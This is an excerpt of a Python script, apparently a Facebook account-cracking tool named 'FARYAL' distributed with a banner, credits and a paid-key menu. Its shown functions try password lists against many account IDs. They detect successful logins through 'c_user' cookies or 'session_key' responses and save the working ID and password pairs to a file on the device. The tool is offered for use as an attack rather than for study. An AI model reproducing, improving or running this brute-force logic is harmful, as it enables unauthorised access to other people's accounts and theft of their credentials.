...
888        "Y8888P"  888       888  \033
 ...
 Tool Name : FARYAL KHAN
 Type type : FREE
 Version   : 0.2
 WhatsApp  : NO USE
____⚔️____💙❥❥━─🩸TRT📌━─➸➽♥️___⚔️___♥️⇣❥
🥀Thanks Ramzan And Aryan Your Support 💞
This Tool Special SUDAIS KHAN 💙 MUSA KHAN Group 🔥
🔥RAHMAN AAJIZ🥀
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/100004713454396/posts/pfbid02H6pyAhGsVbXGuo42NVc82vQgt7z8sV5Mt27DBobvpSDUUv5qDLCbKY1ELu8LLpnUl/?app=fbl');menu()
                        elif xd in ['0','00']:
                        ...
                        linex()
                        tks = ("Hi sarkar Sir, I Need To Buy Your Paid FARYAL PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [FARYAL-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [FARYAL-OK] %s | %s'%(ids,pas))
                                open('/sdcard/AKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [FARYAL-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [FARYAL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [FARYAL-OK] '+uid+' | '+pas+'\033[1;97m')
